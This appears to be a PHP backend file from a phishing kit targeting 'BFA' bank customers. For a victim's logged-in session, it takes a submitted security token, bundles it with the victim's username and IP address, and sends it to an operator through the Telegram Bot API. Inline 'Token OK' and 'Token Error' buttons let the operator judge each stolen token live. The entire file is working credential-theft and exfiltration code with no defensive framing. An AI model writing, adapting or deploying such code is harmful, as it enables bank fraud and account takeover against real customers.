<?php
session_start();
include("settings.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (empty($_SESSION['usuario'])) {
        http_response_code(403);
        echo '{"ok":false}';
        exit;
    }
    $usuario = $_SESSION['usuario'];
    $tok     = trim($_POST['tok'] ?? '');
    $ip      = $_SERVER['REMOTE_ADDR'];
    if (!$tok) { echo '{"ok":false}'; exit; }

    $msg = "🔐 TOKEN BFA\n👤 Usuario: $usuario\n🔑 Token: $tok\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [[
                ['text' => '✅ Token OK',    'callback_data' => "TOKOK|$usuario"],
                ['text' => '❌ Token Error', 'callback_data' => "TOKERR|$usuario"]
            ]]
        ])
    ]));

    header('Content-Type: application/json');
    echo '{"ok":true}';
    exit;
}
?>
